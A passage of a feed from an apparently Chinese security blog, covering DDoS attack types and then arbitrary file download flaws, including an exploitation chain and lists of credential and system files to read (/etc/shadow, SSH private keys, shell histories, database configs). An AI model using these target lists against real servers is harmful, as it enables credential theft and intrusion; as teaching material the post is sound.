&lt;p&gt;&lt;img src=&#34;QQ%E5%9B%BE%E7%89%8720210814175648.png&#34; class=&#34;lazyload placeholder&#34; data-srcset=&#34;QQ%E5%9B%BE%E7%89%8720210814175648.png&#34; srcset=&#34;https://img2.baidu.com/it/u=2037979560,2772131037&amp;fm=26&amp;fmt=auto&amp;gp=0.jpg&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
&lt;p&gt;以上便是文件类型的魔数，然后我们通过获取文件的文件头与文件类型的魔数相比较来判断文件类型&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20210814181913108.png&#34; class=&#34;lazyload placeholder&#34; data-srcset=&#34;image-20210814181913108.png&#34; srcset=&#34;https://img2.baidu.com/it/u=2037979560,2772131037&amp;fm=26&amp;fmt=auto&amp;gp=0.jpg&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;五-ddos攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#五-ddos攻击&#34;&gt;&lt;/a&gt; 五、DDOS攻击&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;DDos攻击&lt;/strong&gt; 又称为 &lt;code&gt;分布式拒绝服务攻击 (Distributed Denial of Service)&lt;/code&gt;，是目前最为强大，最难以防御的攻击方式之一。&lt;/p&gt;
&lt;p&gt;在了解 &lt;strong&gt;DDoS&lt;/strong&gt; 之前，我们需要先知道什么是 &lt;strong&gt;DoS&lt;/strong&gt;。最基本的 &lt;strong&gt;DoS&lt;/strong&gt; 就是利用合理的客户端请求里占用过多的服务器资源，从而使合法用户无法得到服务器的响应。&lt;strong&gt;DDoS&lt;/strong&gt; 攻击便是在传统的 &lt;strong&gt;DoS&lt;/strong&gt; 攻击的基础上产生的一类攻击方式。传统的 &lt;strong&gt;DoS&lt;/strong&gt;攻击一般是一对一的方式，当攻击目标的CPU速度、内存或者网络带宽等各项性能指标不高的情况下，它的效果是明显的，但随着计算机与网络技术的发展，计算机的处理能力显著增加，内存不断增大，这便使得 &lt;strong&gt;DoS&lt;/strong&gt; 攻击逐渐失去了效果。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这就跟单体应用向分布式架构的演进一样，传统的 &lt;strong&gt;DoS&lt;/strong&gt; 演进到了&lt;strong&gt;分布式DoS (DDoS)&lt;/strong&gt; 。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;1-攻击原理-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-攻击原理-4&#34;&gt;&lt;/a&gt; 1、攻击原理&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;DDoS&lt;/strong&gt; 攻击指的便是攻击者借助公共网络，将数量庞大的计算机设备联合起来作为攻击平台，对一个或多个目标发动攻击，从而达到瘫痪目标主机的目的。通常在攻击开始之前，攻击者会提前控制大量的用户计算机，这类计算机称之为 &lt;code&gt;肉鸡&lt;/code&gt;，并通过指令使大量的的肉鸡在同一时刻对某个主机进行访问，从而达到瘫痪目标主机的目的。&lt;/p&gt;
&lt;h4 id=&#34;2-ddos分类&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-ddos分类&#34;&gt;&lt;/a&gt; 2、DDoS分类&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;DDoS&lt;/strong&gt; 是一种攻击手段，其中又分为好几种 &lt;strong&gt;DDoS攻击&lt;/strong&gt;&lt;/p&gt;
&lt;h5 id=&#34;1syn-flood&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1syn-flood&#34;&gt;&lt;/a&gt; 1）SYN Flood&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;SYN Flood&lt;/strong&gt; 是互联网中最经典的攻击方式之一，要了解该攻击方式，我们需要从 &lt;strong&gt;TCP&lt;/strong&gt; 协议连接的过程说起。众所周知，&lt;strong&gt;TCP&lt;/strong&gt; 协议在通信之前，必须先建立基于 TCP 协议的一个连接，以下是建立连接的过程：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20210814183326339.png&#34; class=&#34;lazyload placeholder&#34; data-srcset=&#34;image-20210814183326339.png&#34; srcset=&#34;https://img2.baidu.com/it/u=2037979560,2772131037&amp;fm=26&amp;fmt=auto&amp;gp=0.jpg&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这是一张非常建议的 &lt;strong&gt;TCP 三次握手&lt;/strong&gt;的过程。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;第一步，客户端发送一个包含 &lt;strong&gt;SYN&lt;/strong&gt; 标识的 TCP 报文，SYN 即同步（Synchronized）的意思，&lt;strong&gt;SYN&lt;/strong&gt;报文会指明客户端的端口号以及 TCP 连接的初始序列号&lt;/li&gt;
&lt;li&gt;第二步，服务器在收到客户端的 &lt;strong&gt;SYN&lt;/strong&gt; 报文后，会返回一个 &lt;strong&gt;SYN+ACK&lt;/strong&gt; 的报文，表示客户端请求被接收，同时 TCP 序列号被加 1，&lt;strong&gt;ACK&lt;/strong&gt; 即确认（Acknowledgment）的意思&lt;/li&gt;
&lt;li&gt;第三步，客户端在接收到服务端的 &lt;strong&gt;SYN + ACK&lt;/strong&gt; 报文后，也会返回一个 &lt;strong&gt;ACK&lt;/strong&gt; 报给服务端，同样，TCP 的序列号加 1，这时，TCP连接便建立好了，接下来便可以进行数据通信了。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;TCP 协议&lt;/strong&gt; 是可靠的传输协议，在三次握手的过程中设置了一些异常处理机制。第三步中如果服务器没有收到客户端的 &lt;strong&gt;ACK&lt;/strong&gt; 报文，服务端一般会进行重试，也就是再次发送 &lt;strong&gt;SYN + ACK&lt;/strong&gt; 报文给客户端，并且一直处于 &lt;strong&gt;SYN_RECV&lt;/strong&gt; 的状态，将客户端加入等待列表；另一方面，服务器在发出 &lt;strong&gt;SYN + ACK&lt;/strong&gt; 报文后，会预先分配一部分资源给即将建立的 &lt;strong&gt;TCP&lt;/strong&gt; 连接，这个资源在等待重试期间一直保留，由于服务器的资源有限，可以维护的等待列表超过极限之后就不会再接收新的 &lt;strong&gt;SYN&lt;/strong&gt; 报文，也就是拒绝建立新的 TCP 连接。&lt;/p&gt;
&lt;p&gt;这个时候我们便可以说说 &lt;strong&gt;SYN Flood&lt;/strong&gt; 是怎么回事了，&lt;strong&gt;SYN Flood&lt;/strong&gt;就是利用了 TCP 协议三次握手的过程来达到攻击的目的。攻击者伪造大量的 IP 地址给服务器发送 &lt;strong&gt;SYN&lt;/strong&gt; 报文，因为伪造的 IP 地址不可能存在，也就不可能从客户端得到任何响应，就会一直卡在&lt;strong&gt;第三步&lt;/strong&gt;，服务端就得维护一个非常大的半连接等待列表，并且不断对这个列表中的 IP 地址进行遍历重试，占用了大量的系统资源。而由于服务器资源有限，恶意的连接占满了服务器的等待队列，导致服务器不再接收新的 SYN 请求，使正常的用户无法完成通信。&lt;/p&gt;
&lt;h5 id=&#34;2dns-query-flood&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2dns-query-flood&#34;&gt;&lt;/a&gt; 2）DNS Query Flood&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;DNS Query Flood&lt;/strong&gt; 实际上就是 &lt;strong&gt;UDP Flood&lt;/strong&gt; 攻击的一种变形，因为 &lt;strong&gt;DNS&lt;/strong&gt; 服务在互联网中具有不可替代的作用，因此一旦 &lt;strong&gt;DNS 服务器&lt;/strong&gt; 瘫痪，影响将非常大！&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;DNS Query Flood&lt;/strong&gt; 攻击采用的方法是向被攻击的服务器发送海量的域名解析请求。而这部分请求解析的域名一般都是随机生成的，大部分不存在，并且通过伪造端口和客户端IP，防止查询请求被 &lt;strong&gt;ACL&lt;/strong&gt;（访问控制列表）过滤。被攻击的 &lt;strong&gt;DNS服务器&lt;/strong&gt; 在收到域名解析的请求后，首先会在自己的服务器上查找是否该域名的 IP，因为域名的不存在，在自身自然是找不到的，因此&lt;strong&gt;DNS 服务器&lt;/strong&gt;便会向上层的 DNS服务器递归查询域名，直到全球互联网的 13台 根DNS服务器。大量不存在的域名解析请求给服务器带来了很大的负载，当解析请求超过一定量级的时候，就会造成 &lt;strong&gt;DNS服务器&lt;/strong&gt; 解析域名超时，使正常的域名都查询不到对应的 IP，达到了攻击的效果。&lt;/p&gt;
&lt;h5 id=&#34;3cc-攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3cc-攻击&#34;&gt;&lt;/a&gt; 3）CC 攻击&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;CC&lt;/strong&gt;（Challenge Collapsar）攻击是基于应用层 HTTP 协议发起的攻击，也称为 &lt;strong&gt;HTTP Flood&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CC攻击&lt;/strong&gt;的原理是通过控制大量的 &lt;strong&gt;“肉鸡”&lt;/strong&gt; 或者利用从互联网上搜寻的大量匿名的 HTTP 代理，模拟正常用户给网站发起请求直到该网站拒绝服务为止。大部分网站会通过 &lt;strong&gt;CDN&lt;/strong&gt; 以及分布式缓存来加快服务端的响应，提高网站的吞吐量。而这些恶意的 HTTP 请求会有意的避开这些缓存，需要进行多次 DB 查询操作或者一次请求会返回大量的数据，加速系统资源的消耗，从而拖垮后端的业务处理系统。&lt;/p&gt;
&lt;p&gt;以上便是常见的 Web 攻击手段，知其然知其所以然，安全是极为重要也是极难防护的，每个开发人员都应该引起重视&lt;/p&gt;
</content>
        <category term="安全" />
        <updated>2021-05-21T10:39:27.000Z</updated>
    </entry>
    <entry>
        <id>http://example.com/2021/04/18/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</id>
        <title>任意文件下载</title>
        <link rel="alternate" href="http://example.com/2021/04/18/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"/>
        <content type="html">&lt;h2 id=&#34;原理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#原理&#34;&gt;&lt;/a&gt; 原理&lt;/h2&gt;
&lt;p&gt;产生：任意语言代码下载函数&lt;br /&gt;
文件下载（一些网站由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件不做限制，则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞。）&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;文件下载功能在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后 会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。 如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如…/…/…/etc/passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。&lt;br /&gt;
所以，在设计文件下载功能时，如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;漏洞危害&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞危害&#34;&gt;&lt;/a&gt; 漏洞危害&lt;/h2&gt;
&lt;p&gt;下载服务器任意文件，如脚本代码、服务及系统配置文件等&lt;br /&gt;
可用得到的代码进一步代码审计，得到更多可利用漏洞&lt;/p&gt;
&lt;h2 id=&#34;利用方式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用方式&#34;&gt;&lt;/a&gt; 利用方式&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/dongchi/p/5561039.html&#34;&gt;浅谈任意文件下载漏洞的利用&lt;/a&gt;&lt;br /&gt;
信息收集信息→猜路径→下载配置文件/代码文件→利用服务器软件漏洞→shell→提权&lt;/p&gt;
&lt;p&gt;首先收集系统信息，包括系统版本，中间件，cms版本，服务器用途，服务器使用者信息，端口，web路径等，然后根据收集到的信息，下载配置文件，如weblogic，ftp，ssh等， 根据下载到的配置文件进行渗透。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1. 读取程序源代码（如密码配置文件）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2. 读取程序配置文件（如数据库连接文件）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; 如weblogic，ssh，ftp，数据库配置文件等， 当解出密码后，进行登陆，getshell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3. 读取操作系统关键文件（如/etc/sadow，/ root/.bash_history等文件）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4. 读取运维配置文件（redis/rsync/ftp/ssh客 户端数据等）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5. 读取中间件配置文件（weblogic/tomcat等 密码文件，apache的httpd.conf文件）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6. 下载web日志文件（获取网站后台/上传文件 等）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt;  下载日志文件，找到登录/上传/后台/ 操作，找到登录入口 可以爆破，测试默认口令，弱口令， 找到文件上传点则测试文件上传漏洞，找到后台操作试试有没有未授权访问&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7. 结合SSRF获取内网机器文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8. 可以利用../返回到上级目录下载敏感文件&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;系统文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#系统文件&#34;&gt;&lt;/a&gt; 系统文件&lt;/h2&gt;
&lt;h3 id=&#34;window&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#window&#34;&gt;&lt;/a&gt; window&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; C:\boot.ini //查看系统版本&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; C:\Windows\System32\inetsrv\MetaBase. xml //IIS配置文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; C:\Windows\repair\sam //存储系统初次安装的密码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; C:\Program Files\mysql\my.ini //Mysql配置&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; C:\Program Files\mysql\data\mysql\user. MYD //Mysql root&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; C:\Windows\php.ini //php配置信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; C:\Windows\my.ini //Mysql配置信息&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;linux&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#linux&#34;&gt;&lt;/a&gt; Linux&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; .bash_history` # 历史中可能带着用户的密码 ( 遇到过现实案例,是输错的情况下参数的,比如没 输入 su 却以为自己输了 su)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; /etc/passwd # 用户情况&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; /etc/shadow # 直接 John the Ripper&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; /etc/hosts # 主机信息，通常配置了一些内网 域名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; /root/.bash_history //root的bash历史记录&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; /root/.ssh/authorized_keys /root/.mysql_history //mysql的bash历史记录&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; /root/.wget-hsts /opt/nginx/conf/nginx.conf //nginx的配置文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; /var/www/html/index.html /etc/my.cnf /etc/httpd/conf/httpd.conf //httpd的配置文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; /proc/self/fd/fd[0-9]*(文件标识符)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; /proc/mounts /porc/config.gz /proc/sched_debug // 提供cpu上正在运行的进程信息，可以获得进程的pid号，可以配合后面需要pid的利用&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; /proc/mounts // 挂载的文件系统列表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; /proc/net/arp //arp表，可以获得内网其他机器的地址&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; /proc/net/route //路由表信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; /proc/net/tcp and /proc/net/udp // 活动连接的信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; /proc/net/fib_trie // 路由缓存&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; /proc/version // 内核版本&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; /proc/[PID]/cmdline // 可能包含有用的路径信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; /proc/[PID]/environ // 程序运行的环境变量信息，可以用来包含getshell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; /proc/[PID]/cwd // 当前进程的工作目录&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; /proc/[PID]/fd/[#] // 访问file descriptors， 某写情况可以读取到进程正在使用的文件，比如 access.log /root/.ssh/id_rsa /root/.ssh/id_rsa.pub /root/.ssh/authorized_keys /etc/ssh/sshd_config /var/log/secure /etc/sysconfig/network-scripts/ifcfg-eth0 /etc/syscomfig/network-scripts/ifcfg-eth1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; /usr/local/tomcat/conf/tomcat-users. xml # tomcat 用户配置文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; /root/.bashrc # 环境变量&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; /root/.bash_history # 还有root外的其他用户&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; /root/.viminfo # vim 信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; /root/.ssh/id_rsa # 拿私钥直接ssh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; /proc/xxxx/cmdline # 进程状态枚举 xxxx 可以为0000-9999 使用burpsuite 数据库 config 文件   web 日志 access.log, error.log /var/lib/php/sess_PHPSESSID # 非常规问题 session 文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; /proc/net/arp /proc/net/tcp /proc/net/udp /proc/net/dev&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;常见脚本敏感文件参考&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#常见脚本敏感文件参考&#34;&gt;&lt;/a&gt; 常见脚本敏感文件参考&lt;/h2&gt;
&lt;p&gt;PHP： inc/config. php获得数据库连接字符串中的口令信息&lt;br /&gt;
asp： inc/conn.asp文件，获得数据库连接字符串，得到数据库口令。&lt;br /&gt;
aspx： web.config网站根目录文件，获得数据库连接信息。&lt;br /&gt;
JSP： conf/ tomcat-user.xml文件，获得tomcat管理界面的口令信息&lt;br /&gt;
WEB- INF /Web. xml文件,获得数据库连接字符串中的口令信息。&lt;/p&gt;
&lt;h2 id=&#34;任意文件读取&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#任意文件读取&#34;&gt;&lt;/a&gt; 任意文件读取&lt;/h2&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;test.txt&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;readfile(&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;test.txt&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$fp&lt;/span&gt; = fopen(&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;r&amp;quot;&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Unable to open file!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$data&lt;/span&gt; = fread(&lt;span class=&#34;variable&#34;&gt;$fp&lt;/span&gt;,filesize(&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fclose(&lt;span class=&#34;variable&#34;&gt;$fp&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$data&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;test.txt&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; file_get_contents(&lt;span 